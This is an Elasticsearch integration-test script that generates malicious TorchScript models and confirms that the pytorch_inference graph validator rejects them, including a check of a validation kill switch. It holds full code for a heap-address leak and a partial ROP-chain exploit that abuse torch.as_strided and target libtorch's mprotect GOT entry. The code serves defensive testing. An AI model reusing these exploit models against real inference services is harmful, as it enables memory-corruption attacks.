#!/usr/bin/env python3
#
# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0 and the following additional limitation. Functionality enabled by the
# files subject to the Elastic License 2.0 may only be used in production when
# invoked by an Elasticsearch process with a license key installed that permits
# use of machine learning features. You may not use this file except in
# compliance with the Elastic License 2.0 and the foregoing additional
# limitation.
#
"""Integration test: verify pytorch_inference rejects sandbox2 attack models.

Generates the evil TorchScript models from PR #2873 and feeds them to the
pytorch_inference binary to confirm the CModelGraphValidator rejects them
at load time before any tensor code executes.

Usage:
    python3 test_pytorch_inference_evil_models.py [--binary PATH]

    --binary PATH   Explicit path to the pytorch_inference binary.
                    If omitted, the script searches standard build locations.

Requires: torch, a built pytorch_inference binary with graph validation
          (feature/harden_pytorch_inference branch or later).
"""

import argparse
import os
import platform
import shutil
import subprocess
import sys
import tempfile
from pathlib import Path

import torch
from torch import Tensor


# ---------------------------------------------------------------------------
# Evil model definitions (from PR #2873 sandbox2 attack tests)
# ---------------------------------------------------------------------------


class SimpleBenignModel(torch.nn.Module):
    """Positive control — uses only allowlisted ops (add, unsqueeze)."""
    def forward(self, a: Tensor, b: Tensor, c: Tensor, d: Tensor) -> Tensor:
        return (a + b + c + d).unsqueeze(0)


class LeakModel(torch.nn.Module):
    """Heap-address leak via torch.as_strided with a malicious storage offset."""
    def find_heap_overlap(self, tensors: Tensor) -> tuple[list[int], Tensor]:
        evil_length = 0x900 * 8
        leak = torch.as_strided(
            tensors, [evil_length], [1], 2305843009213693952 - evil_length
        )
        index: list[int] = [-1]
        for i in range(evil_length - 1 - 5, -1, -1):
            if (
                leak[i + 3].item() == leak[i + 5].item()
                and leak[i + 3].item() >> 40 == 127
            ):
                if (
                    leak[i + 2].item() >= 0x100000000
                    and leak[i + 2].item() <= 0x100000005
                ):
                    index.append(i)
        return (index, leak)

    def forward(self, a: Tensor, b: Tensor, c: Tensor, d: Tensor) -> Tensor:
        tmp: list[Tensor] = []
        heap_len = 200
        array_len = 0x900
        for i in range(heap_len):
            tmp_values = [0xDEAD00000 + i] + [
                0xDEAD00000 + j for j in range(2, array_len)
            ]
            tmp.append(torch.tensor(tmp_values))
        for i in range(heap_len):
            indexs, leak = self.find_heap_overlap(tmp[i])
            indexs = indexs[1:]
            if indexs == []:
                continue
            for index in indexs:
                heap_addr = leak[index + 3].item()
                libtorch_python_addr = leak[index + 1].item()
                libtorch_cpu_addr = libtorch_python_addr - 0xC878B50
                assert 1 == 0, (
                    "Input tensor must have at least one element: "
                    + hex(libtorch_cpu_addr)
                )
        for i in range(heap_len):
            print(tmp[i].shape)
        return torch.zeros(0)


class ExploitModel(torch.nn.Module):
    """ROP-chain exploit: mprotect + shellcode to write files."""
    def find_heap_overlap(self, tensors: Tensor) -> tuple[list[int], Tensor]:
        evil_length = 0x900 * 8
        leak = torch.as_strided(
            tensors, [evil_length], [1], 2305843009213693952 - evil_length
        )
        index: list[int] = [-1]
        for i in range(evil_length - 1 - 5, -1, -1):
            if (
                leak[i + 3].item() == leak[i + 5].item()
                and leak[i + 3].item() >> 40 == 127
            ):
                if (
                    leak[i + 2].item() >= 0x100000000
                    and leak[i + 2].item() <= 0x100000005
                ):
                    index.append(i)
        return (index, leak)

    def get_address_data(
        self, leak: Tensor, index: int, tmp: list[Tensor], target_addr: int
    ) -> int:
        leak[index] = target_addr
        return int(tmp[0].item())

    def forward(self, a: Tensor, b: Tensor, c: Tensor, d: Tensor) -> Tensor:
        tmp: list[Tensor] = []
        heap_len = 200
        array_len = 0x900
        for i in range(heap_len):
            tmp_values = [0xDEAD00000 + i] + [
                0xDEAD00000 + j for j in range(2, array_len)
            ]
            tmp.append(torch.tensor(tmp_values))
        for i in range(heap_len):
            indexs, leak = self.find_heap_overlap(tmp[i])
            indexs = indexs[1:]
            if indexs == []:
                continue
            for index in indexs:
                heap_addr = leak[index + 3].item()
                libtorch_python_addr = leak[index + 1].item()
                libtorch_cpu_addr = libtorch_python_addr - 0xC878B50
                leak[index + 3] = int(heap_addr - 0x8)
                for j in range(heap_len):
                    if tmp[j][2].item() == 0xDEAD00002 and i != j:
                        mprotect_got_addr = 0xC9785F0 + libtorch_cpu_addr
                        self.get_address_data(
                            leak, index + 3, tmp[j : j + 1], int(mprotect_got_addr)
                        )
                        del tmp[j]
                        assert 1 == 0, "Input tensor must have at least one element: "
                        return torch.zeros(0)
        for i in range(heap_len):
            print(tmp[i].shape)
        return torch.zeros(0)


# ---------------------------------------------------------------------------
# Binary discovery
# ---------------------------------------------------------------------------


def find_pytorch_inference() -> str:
    """Locate the pytorch_inference binary in standard build locations."""
    project_root = Path(__file__).resolve().parent.parent

    machine = platform.machine()
    if machine in ("arm64", "aarch64"):
        darwin_arch = "darwin-aarch64"
        linux_arch = "linux-aarch64"
    else:
        darwin_arch = "darwin-x86_64"
        linux_arch = "linux-x86_64"

    candidates = [
        # macOS distribution bundle
        project_root
        / "build"
        / "distribution"
        / "platform"
        / darwin_arch
        / "controller.app"
        / "Contents"
        / "MacOS"
        / "pytorch_inference",
        # Linux distribution
        project_root
        / "build"
        / "distribution"
        / "platform"
        / linux_arch
        / "bin"
        / "pytorch_inference",
        # CMake build directories
        project_root
        / "cmake-build-relwithdebinfo"
        / "bin"
        / "pytorch_inference"
        / "pytorch_inference",
        project_root
        / "cmake-build-debug"
        / "bin"
        / "pytorch_inference"
        / "pytorch_inference",
        project_root
        / "cmake-build-release"
        / "bin"
        / "pytorch_inference"
        / "pytorch_inference",
    ]

    for path in candidates:
        if path.is_file() and os.access(path, os.X_OK):
            return str(path)

    raise FileNotFoundError(
        "Could not find pytorch_inference binary. "
        "Build from the feature/harden_pytorch_inference branch, or pass --binary."
    )


# ---------------------------------------------------------------------------
# Model generation
# ---------------------------------------------------------------------------

MODELS = {
    "benign": {
        "class": SimpleBenignModel,
        "expect_rejected": False,
        "description": "positive control — only allowlisted ops",
    },
    "leak": {
        "class": LeakModel,
        "expect_rejected": True,
        "description": "heap-address leak via aten::as_strided",
        "expect_stderr_contains": "Unrecognised operations",
    },
    "exploit": {
        "class": ExploitModel,
        "expect_rejected": True,
        "description": "ROP-chain file-write via aten::as_strided",
        "expect_stderr_contains": "Unrecognised operations",
    },
}


def generate_model(cls, path: Path) -> None:
    model = cls()
    scripted = torch.jit.script(model)
    torch.jit.save(scripted, str(path))


# ---------------------------------------------------------------------------
# Test execution
# ---------------------------------------------------------------------------


def prepare_restore_file(model_path: Path, restore_path: Path) -> None:
    """Wrap a .pt file with the 4-byte big-endian size header that
    CBufferedIStreamAdapter expects (matching how Elasticsearch sends models)."""
    import struct

    model_bytes = model_path.read_bytes()
    with open(restore_path, "wb") as f:
        f.write(struct.pack("!I", len(model_bytes)))
        f.write(model_bytes)


def run_pytorch_inference(binary: str, model_path: Path, tmp_dir: Path,
                          timeout: int = 30, extra_env: dict | None = None) -> tuple[int, str, str]:
    """Run pytorch_inference against a model file.

    Returns (exit_code, stdout, stderr).
    """
    restore_file = tmp_dir / f"{model_path.stem}_restore.bin"
    prepare_restore_file(model_path, restore_file)

    cmd = [
        binary,
        f"--restore={restore_file}",
        "--validElasticLicenseKeyConfirmed=true",
    ]
    env = os.environ.copy()
    if extra_env:
        env.update(extra_env)
    proc = subprocess.run(
        cmd,
        stdin=subprocess.DEVNULL,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        timeout=timeout,
        env=env,
    )
    return proc.returncode, proc.stdout.decode("utf-8", errors="replace"), proc.stderr.decode("utf-8", errors="replace")


def run_tests(binary: str) -> bool:
    print("=" * 72)
    print("Integration Test: pytorch_inference vs sandbox2 attack models")
    print("=" * 72)
    print(f"Binary: {binary}")
    print()

    tmp_dir = Path(tempfile.mkdtemp(prefix="pt_infer_evil_test_"))
    all_passed = True

    try:
        for name, spec in MODELS.items():
            model_path = tmp_dir / f"model_{name}.pt"
            expect_rejected = spec["expect_rejected"]

            print(f"--- {name}: {spec['description']} ---")

            try:
                generate_model(spec["class"], model_path)
                print(f"  Model generated: {model_path.name} ({model_path.stat().st_size} bytes)")
            except Exception as e:
                print(f"  SKIP: could not generate model: {e}")
                print()
                continue

            try:
                exit_code, stdout, stderr = run_pytorch_inference(binary, model_path, tmp_dir)
            except subprocess.TimeoutExpired:
                print(f"  FAIL: pytorch_inference timed out (30s)")
                all_passed = False
                print()
                continue
            except Exception as e:
                print(f"  ERROR running pytorch_inference: {e}")
                all_passed = False
                print()
                continue

            print(f"  Exit code: {exit_code}")
            if stderr.strip():
                # Show last few lines of stderr (log output can be verbose)
                stderr_lines = stderr.strip().splitlines()
                display_lines = stderr_lines[-10:] if len(stderr_lines) > 10 else stderr_lines
                print(f"  Stderr ({len(stderr_lines)} lines, showing last {len(display_lines)}):")
                for line in display_lines:
                    print(f"    {line}")

            validation_rejection_phrases = [
                "Model contains forbidden operations:",
                "Unrecognised operations:",
                "graph validation failed",
                "graph is too large:",
                # Older main-branch validator message
                "contains forbidden operation:",
            ]
            was_rejected_by_validator = any(p in stderr for p in validation_rejection_phrases)

            if expect_rejected:
                if was_rejected_by_validator:
                    print(f"  Result: REJECTED by graph validator (as expected)")
                    expect_msg = spec.get("expect_stderr_contains")
                    if expect_msg and expect_msg in stderr:
                        print(f"  Reason check: found '{expect_msg}' in stderr")
                    print(f"  Test: OK")
                elif exit_code != 0:
                    print(f"  Result: process exited with code {exit_code} but no validator rejection detected")
                    print(f"  WARNING: the binary may not include the full graph validation yet")
                    print(f"  Test: INCONCLUSIVE (not counted as failure)")
                else:
                    print(f"  Result: ACCEPTED (exit 0, no validator rejection)")
                    print(f"  Test: FAIL — evil model was not rejected")
                    all_passed = False
            else:
                if was_rejected_by_validator:
                    print(f"  Result: REJECTED by validator — benign model should have passed")
                    print(f"  Test: FAIL")
                    all_passed = False
                else:
                    print(f"  Result: no validation errors (exit code {exit_code})")
                    print(f"  Test: OK")

            print()

        # --- Kill switch test ---
        # Verify ML_SKIP_MODEL_VALIDATION=true bypasses the graph validator.
        # Use the leak model (which is normally rejected) and confirm it is
        # accepted when the kill switch is set.
        print("--- kill_switch: ML_SKIP_MODEL_VALIDATION=true bypasses validation ---")
        leak_path = tmp_dir / "model_leak.pt"
        if leak_path.exists():
            try:
                exit_code, stdout, stderr = run_pytorch_inference(
                    binary, leak_path, tmp_dir,
                    extra_env={"ML_SKIP_MODEL_VALIDATION": "true"})
            except subprocess.TimeoutExpired:
                exit_code, stderr = -1, ""

            skip_msg = "Model graph validation SKIPPED"
            if skip_msg in stderr:
                print(f"  Result: validation skipped (kill switch active)")
                print(f"  Test: OK")
            else:
                print(f"  Result: kill switch did not take effect")
                print(f"  Exit code: {exit_code}")
                stderr_lines = stderr.strip().splitlines()[-5:]
                for line in stderr_lines:
                    print(f"    {line}")
                print(f"  Test: FAIL")
                all_passed = False

            # Also verify ML_SKIP_MODEL_VALIDATION=false does NOT skip
            print()
            print("--- kill_switch_false: ML_SKIP_MODEL_VALIDATION=false still validates ---")
            try:
                exit_code, stdout, stderr = run_pytorch_inference(
                    binary, leak_path, tmp_dir,
                    extra_env={"ML_SKIP_MODEL_VALIDATION": "false"})
            except subprocess.TimeoutExpired:
                exit_code, stderr = -1, ""

            was_rejected = any(p in stderr for p in validation_rejection_phrases)
            if was_rejected:
                print(f"  Result: model rejected (validation still active)")
                print(f"  Test: OK")
            else:
                print(f"  Result: validation was bypassed by value 'false'")
                print(f"  Test: FAIL — only 'true' should bypass")
                all_passed = False
        else:
            print("  SKIP: leak model not generated")

        print()

    finally:
        shutil.rmtree(tmp_dir, ignore_errors=True)

    print("=" * 72)
    if all_passed:
        print("ALL TESTS PASSED")
    else:
        print("SOME TESTS FAILED — see above for details.")
    print("=" * 72)

    return all_passed


def main():
    parser = argparse.ArgumentParser(
        description="Integration test: pytorch_inference vs evil models"
    )
    parser.add_argument(
        "--binary",
        default=None,
        help="Path to pytorch_inference binary (auto-detected if omitted)",
    )
    args = parser.parse_args()

    binary = args.binary
    if binary is None:
        try:
            binary = find_pytorch_inference()
        except FileNotFoundError as e:
            print(f"ERROR: {e}", file=sys.stderr)
            sys.exit(1)

    if not os.path.isfile(binary) or not os.access(binary, os.X_OK):
        print(f"ERROR: {binary} is not an executable file", file=sys.stderr)
        sys.exit(1)

    success = run_tests(binary)
    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
